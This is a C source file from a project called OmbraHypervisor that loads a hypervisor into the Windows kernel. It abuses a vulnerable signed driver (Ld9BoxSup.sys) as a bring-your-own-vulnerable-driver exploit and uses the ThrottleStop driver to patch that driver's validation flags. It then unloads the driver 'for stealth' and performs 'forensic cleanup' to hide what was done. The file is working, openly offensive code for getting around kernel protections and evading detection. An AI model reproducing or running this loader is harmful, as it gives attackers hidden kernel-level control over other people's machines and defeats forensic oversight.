// hv_loader.c - Hypervisor Loader Implementation (Self-Contained Design)
// OmbraHypervisor
//
// Simplified loader for self-contained hypervisor.
// The hypervisor now resolves symbols and allocates resources internally.
// Loader only needs to:
// 1. Load the hypervisor PE into kernel memory via BYOVD
// 2. Resolve MmGetSystemRoutineAddress and pass it to HvEntry
//
// This dramatically simplifies the loader and moves complexity into
// the hypervisor where it's easier to debug.

#include "hv_loader.h"
#include "pe_utils.h"
#include "pe_parser.h"
#include "pe_relocs.h"
#include "cleanup.h"
#include "../byovd/supdrv.h"
#include "../byovd/throttlestop.h"
#include "../byovd/nt_defs.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// =============================================================================
// HvEntry Function Pointer Type
// =============================================================================

typedef int (*FN_HvEntry)(void* MmGetSystemRoutineAddress);

// =============================================================================
// .ombra Section Bootstrap Structure (must match shared/types.h OMBRA_BOOTSTRAP)
// =============================================================================

typedef struct _LOADER_OMBRA_BOOTSTRAP {
    U64 Magic;          // 'OMBR' = 0x524D424F
    U64 Version;        // 1
    U64 ParamsPtr;      // We store MmGetSystemRoutineAddress here directly
    U64 Reserved[5];
} LOADER_OMBRA_BOOTSTRAP;

#define OMBRA_MAGIC 0x524D424F

// =============================================================================
// Patch .ombra Section with MmGetSystemRoutineAddress
// =============================================================================
//
// The hypervisor's .ombra section contains g_Bootstrap which expects ParamsPtr
// to be set. In the new self-contained design, we store MmGetSystemRoutineAddress
// directly in ParamsPtr (instead of a pointer to HV_INIT_PARAMS).

static BOOL PatchOmbraSection(void* image, U32 imageSize, PE_INFO* peInfo, U64 mmGetSystemRoutineAddress) {
    // Find .ombra section
    PE_SECTION_INFO* ombraSection = PeGetSection(peInfo, ".ombra");
    if (!ombraSection) {
        printf("[!] .ombra section not found in hypervisor\n");
        return FALSE;
    }

    // Validate section size
    if (ombraSection->VirtualSize < sizeof(LOADER_OMBRA_BOOTSTRAP)) {
        printf("[!] .ombra section too small: %u bytes\n", ombraSection->VirtualSize);
        return FALSE;
    }

    // Get pointer to .ombra in our image copy
    LOADER_OMBRA_BOOTSTRAP* bootstrap = (LOADER_OMBRA_BOOTSTRAP*)((U8*)image + ombraSection->Rva);

    // Verify magic
    if (bootstrap->Magic != OMBRA_MAGIC) {
        printf("[!] .ombra magic mismatch: expected 0x%X, got 0x%llX\n",
               OMBRA_MAGIC, bootstrap->Magic);
        return FALSE;
    }

    // Verify version
    if (bootstrap->Version != 1) {
        printf("[!] .ombra version mismatch: expected 1, got %llu\n", bootstrap->Version);
        return FALSE;
    }

    // Patch ParamsPtr with MmGetSystemRoutineAddress
    bootstrap->ParamsPtr = mmGetSystemRoutineAddress;

    printf("[+] Patched .ombra section @ RVA 0x%X: ParamsPtr=0x%llX\n",
           ombraSection->Rva, mmGetSystemRoutineAddress);

    return TRUE;
}

// =============================================================================
// Resolve MmGetSystemRoutineAddress
// =============================================================================

static BOOL ResolveMmGetSystemRoutineAddress(DRV_CONTEXT* drv, U64* outAddr) {
    void* addr;

    if (DrvGetSymbol(drv, "MmGetSystemRoutineAddress", &addr) != DRV_SUCCESS) {
        printf("[-] Failed to resolve MmGetSystemRoutineAddress\n");
        return FALSE;
    }

    *outAddr = (U64)addr;
    printf("[+] MmGetSystemRoutineAddress @ 0x%llX\n", *outAddr);
    return TRUE;
}

// =============================================================================
// Apply -618 Bypass
// =============================================================================

static BOOL Apply618Bypass(void) {
    printf("[*] Applying -618 bypass via ThrottleStop...\n");

    // Get Ld9BoxSup.sys base address
    UINT64 ld9BoxBase = NtGetDriverBase(L"ld9box");
    if (ld9BoxBase == 0) {
        printf("[!] Warning: Could not find Ld9BoxSup.sys base address\n");
        printf("    Proceeding without bypass - LDR_OPEN may fail with -618\n");
        return TRUE;  // Continue anyway
    }

    printf("[+] Ld9BoxSup.sys base: 0x%llX\n", ld9BoxBase);

    // Initialize ThrottleStop context
    TS_CTX tsCtx;
    TS_Init(&tsCtx);

    // Initialize ThrottleStop driver
    if (TS_Initialize(&tsCtx, NULL)) {
        printf("[+] ThrottleStop initialized\n");

        // Patch the -618 validation flags
        if (TS_Patch618Flags(&tsCtx, ld9BoxBase)) {
            printf("[+] -618 bypass: Validation flags patched successfully\n");
        } else {
            printf("[!] -618 bypass: Failed to patch flags: %s\n", TS_GetLastError(&tsCtx));
            printf("    LDR_OPEN may still succeed if already patched\n");
        }

        // Cleanup ThrottleStop driver (unload for stealth)
        TS_Cleanup(&tsCtx);
        printf("[+] ThrottleStop cleaned up\n");
    } else {
        printf("[!] ThrottleStop init failed: %s\n", TS_GetLastError(&tsCtx));
        printf("    Proceeding without bypass\n");
    }

    printf("[*] -618 bypass complete\n");
    return TRUE;
}

// =============================================================================
// Allocate and Map Hypervisor Image
// =============================================================================

static BOOL AllocateHypervisorImage(HV_LOADER_CTX* ctx, U32 hvImageSize) {
    // NOTE: -618 bypass is now applied in HvLoaderInit() BEFORE driver start
    // This ensures DriverEntry's IoCreateDevice succeeds

    // LDR_OPEN: request kernel memory for image
    void* imageBase = NULL;
    DRV_STATUS status = DrvLdrOpen(&ctx->Driver, hvImageSize, &imageBase);
    if (status != DRV_SUCCESS) {
        printf("[-] LDR_OPEN failed: %s\n", DrvStatusString(status));
        return FALSE;
    }
    printf("[+] LDR_OPEN: imageBase = 0x%p\n", imageBase);

    ctx->ImageBase = imageBase;
    ctx->ImageSize = hvImageSize;

    return TRUE;
}

// =============================================================================
// Execute Hypervisor Entry Point
// =============================================================================
//
// Uses standard DrvLdrLoad (5 params). MmGetSystemRoutineAddress is passed
// via the .ombra section which was patched before this function is called.
// The hypervisor's OmbraModuleInit reads ParamsPtr from g_Bootstrap.

static BOOL ExecuteHypervisorEntry(HV_LOADER_CTX* ctx, void* hvImage, U32 hvImageSize,
                                   PE_INFO* peInfo) {
    // Calculate entry point kernel address from PE_INFO
    void* entryPoint = (U8*)ctx->ImageBase + peInfo->EntryPointRva;
    printf("[*] Entry point RVA: 0x%X\n", peInfo->EntryPointRva);
    printf("[*] Entry point (OmbraModuleInit) @ 0x%p\n", entryPoint);

    // LDR_LOAD: copy image and invoke entry point
    // MmGetSystemRoutineAddress was already patched into the .ombra section.
    // OmbraModuleInit will read it from g_Bootstrap.ParamsPtr.
    printf("[*] Loading hypervisor into kernel (MmGetSystemRoutineAddress via .ombra)...\n");

    DRV_STATUS status = DrvLdrLoad(&ctx->Driver, ctx->ImageBase,
                                   hvImage, hvImageSize, entryPoint);
    if (status != DRV_SUCCESS) {
        printf("[-] LDR_LOAD failed: %s\n", DrvStatusString(status));
        DrvLdrFree(&ctx->Driver, ctx->ImageBase);
        ctx->ImageBase = NULL;
        return FALSE;
    }
    printf("[+] LDR_LOAD: hypervisor loaded and OmbraModuleInit called\n");

    return TRUE;
}

// =============================================================================
// Public API Implementation
// =============================================================================

BOOL HvLoaderInit(HV_LOADER_CTX* ctx, const wchar_t* driverPath) {
    memset(ctx, 0, sizeof(*ctx));

    printf("[*] Initializing hypervisor loader (self-contained mode)\n");

    // Step 1: Install driver service (but DON'T start yet)
    printf("[*] Installing driver service...\n");
    DRV_STATUS status = DrvInstallDriver(&ctx->Driver, driverPath);
    if (status != DRV_SUCCESS) {
        printf("[-] Failed to install driver: %s\n", DrvStatusString(status));
        return FALSE;
    }
    printf("[+] Driver service installed\n");

    // Step 2: Apply -618 bypass BEFORE starting driver
    // This patches validation flags so DriverEntry's IoCreateDevice succeeds
    printf("[*] Applying -618 bypass before driver start...\n");
    Apply618Bypass();

    // Step 3: NOW start the driver (validation flags are patched)
    printf("[*] Starting driver service...\n");
    status = DrvStartDriver(&ctx->Driver);
    if (status != DRV_SUCCESS) {
        printf("[-] Failed to start driver: %s\n", DrvStatusString(status));
        DrvUnloadDriver(&ctx->Driver);
        return FALSE;
    }
    printf("[+] Driver service started\n");

    // Step 4: Open device handle (device should now exist)
    printf("[*] Opening device handle...\n");
    status = DrvOpenDevice(&ctx->Driver);
    if (status != DRV_SUCCESS) {
        printf("[-] Failed to open device: %s\n", DrvStatusString(status));
        DrvUnloadDriver(&ctx->Driver);
        return FALSE;
    }
    printf("[+] Device handle opened\n");

    // Step 5: Establish session
    printf("[*] Establishing session...\n");
    status = DrvEstablishSession(&ctx->Driver);
    if (status != DRV_SUCCESS) {
        printf("[-] Failed to establish session: %s\n", DrvStatusString(status));
        CloseHandle(ctx->Driver.hDevice);
        DrvUnloadDriver(&ctx->Driver);
        return FALSE;
    }
    printf("[+] Session established\n");

    // Step 6: Cache VMX MSRs (non-fatal if fails)
    status = DrvGetVmxMsrs(&ctx->Driver, &ctx->Driver.VmxMsrs);
    if (status != DRV_SUCCESS) {
        printf("[!] Warning: Could not cache VMX MSRs\n");
    }

    // Get CPU count (for display purposes only - hypervisor gets this itself)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    ctx->CpuCount = sysInfo.dwNumberOfProcessors;
    printf("[+] System has %u CPUs\n", ctx->CpuCount);

    return TRUE;
}

BOOL HvLoaderLoad(HV_LOADER_CTX* ctx, const void* hvImage, U32 hvImageSize) {
    U64 mmGetSystemRoutineAddress = 0;
    PE_INFO peInfo = {0};

    printf("[*] Loading hypervisor (%u bytes) - self-contained mode\n", hvImageSize);
    printf("[*] Hypervisor will resolve symbols and allocate resources internally\n");

    // 1. Parse PE to get section info and relocation data
    printf("[*] Parsing hypervisor PE...\n");
    if (!PeParse(hvImage, hvImageSize, &peInfo)) {
        printf("[-] Failed to parse hypervisor PE\n");
        return FALSE;
    }
    printf("[+] PE parsed: ImageBase=0x%llX, EntryRVA=0x%X, Sections=%u\n",
           peInfo.ImageBase, peInfo.EntryPointRva, peInfo.SectionCount);

    // 2. Resolve MmGetSystemRoutineAddress - the bootstrap function
    printf("[*] Resolving bootstrap function...\n");
    if (!ResolveMmGetSystemRoutineAddress(&ctx->Driver, &mmGetSystemRoutineAddress)) {
        return FALSE;
    }

    // 3. Make a copy of image for modifications (relocations + .ombra patching)
    void* hvImageCopy = malloc(hvImageSize);
    if (!hvImageCopy) {
        printf("[-] Failed to allocate image copy\n");
        return FALSE;
    }
    memcpy(hvImageCopy, hvImage, hvImageSize);

    // 4. Patch .ombra section with MmGetSystemRoutineAddress
    // This allows the hypervisor to bootstrap without needing DrvLdrLoadWithArg
    printf("[*] Patching .ombra bootstrap section...\n");
    if (!PatchOmbraSection(hvImageCopy, hvImageSize, &peInfo, mmGetSystemRoutineAddress)) {
        printf("[!] Warning: Could not patch .ombra section\n");
        printf("    Hypervisor may fail to initialize without MmGetSystemRoutineAddress\n");
        // Continue anyway - maybe legacy params are set up differently
    }

    // 5. Allocate kernel memory for hypervisor
    printf("[*] Allocating kernel memory for hypervisor...\n");
    if (!AllocateHypervisorImage(ctx, hvImageSize)) {
        free(hvImageCopy);
        return FALSE;
    }

    // 6. Apply relocations to the image copy based on new kernel base
    // Update peInfo.ImageBase to reflect the new kernel address
    printf("[*] Applying PE relocations (delta from 0x%llX to 0x%p)...\n",
           peInfo.ImageBase, ctx->ImageBase);
    peInfo.ImageBase = (U64)ctx->ImageBase;  // Update for relocation delta calculation

    if (!ApplyRelocations(hvImageCopy, &peInfo, (U64)ctx->ImageBase)) {
        printf("[-] Failed to apply relocations\n");
        free(hvImageCopy);
        DrvLdrFree(&ctx->Driver, ctx->ImageBase);
        ctx->ImageBase = NULL;
        return FALSE;
    }
    printf("[+] Relocations applied successfully\n");

    // 7. Execute hypervisor entry point (OmbraModuleInit)
    // MmGetSystemRoutineAddress is already in .ombra section
    printf("[*] Executing OmbraModuleInit...\n");
    if (!ExecuteHypervisorEntry(ctx, hvImageCopy, hvImageSize, &peInfo)) {
        free(hvImageCopy);
        return FALSE;
    }

    free(hvImageCopy);

    ctx->Loaded = TRUE;
    ctx->Running = TRUE;

    printf("[+] Hypervisor loaded and running!\n");

    // =========================================================================
    // EPHEMERAL DRIVER UNLOAD
    // =========================================================================
    // The hypervisor is now running in VMX root mode and has its own memory
    // management via kernel symbols resolved at runtime. The BYOVD driver
    // (Ld9BoxSup.sys) is no longer needed - unload it for stealth.
    // =========================================================================

    printf("[*] Unloading BYOVD driver (ephemeral mode)...\n");

    // Close device handle first
    if (ctx->Driver.hDevice) {
        CloseHandle(ctx->Driver.hDevice);
        ctx->Driver.hDevice = NULL;
    }

    // Unload the driver service
    DRV_STATUS unloadStatus = DrvUnloadDriver(&ctx->Driver);
    if (unloadStatus == DRV_SUCCESS) {
        printf("[+] BYOVD driver unloaded successfully\n");
    } else {
        printf("[!] Warning: BYOVD driver unload failed (error %d)\n", unloadStatus);
        printf("    Hypervisor is running but driver remains loaded\n");
    }

    // Perform usermode forensic cleanup
    printf("[*] Performing forensic cleanup...\n");
    PerformForensicCleanup(FALSE);

    return TRUE;
}

BOOL HvLoaderUnload(HV_LOADER_CTX* ctx) {
    if (!ctx->Loaded) {
        return FALSE;
    }

    printf("[*] Unloading hypervisor...\n");

    // TODO: Issue VMCALL_UNLOAD to gracefully exit VMX on all CPUs
    // The hypervisor will call VMXOFF and free its allocated resources

    ctx->Running = FALSE;

    // Free the loaded kernel module (if BYOVD still available)
    if (ctx->ImageBase && ctx->Driver.hDevice) {
        DRV_STATUS status = DrvLdrFree(&ctx->Driver, ctx->ImageBase);
        if (status != DRV_SUCCESS) {
            printf("[!] Warning: DrvLdrFree failed: %s\n", DrvStatusString(status));
        }
    }
    ctx->ImageBase = NULL;
    ctx->ImageSize = 0;
    ctx->Loaded = FALSE;

    return TRUE;
}

BOOL HvLoaderIsRunning(HV_LOADER_CTX* ctx) {
    return ctx->Running;
}

void HvLoaderCleanup(HV_LOADER_CTX* ctx) {
    if (ctx->Running) {
        HvLoaderUnload(ctx);
    }

    DrvCleanup(&ctx->Driver);
    memset(ctx, 0, sizeof(*ctx));
}

// =============================================================================
// Debug Buffer Access (optional - hypervisor allocates its own now)
// =============================================================================

void* HvLoaderGetDebugBuffer(HV_LOADER_CTX* ctx) {
    // With self-contained design, hypervisor allocates its own debug buffer
    // This function returns NULL - debug output accessed via VMCALL
    (void)ctx;
    return NULL;
}

U64 HvLoaderGetDebugBufferSize(HV_LOADER_CTX* ctx) {
    (void)ctx;
    return 0;
}
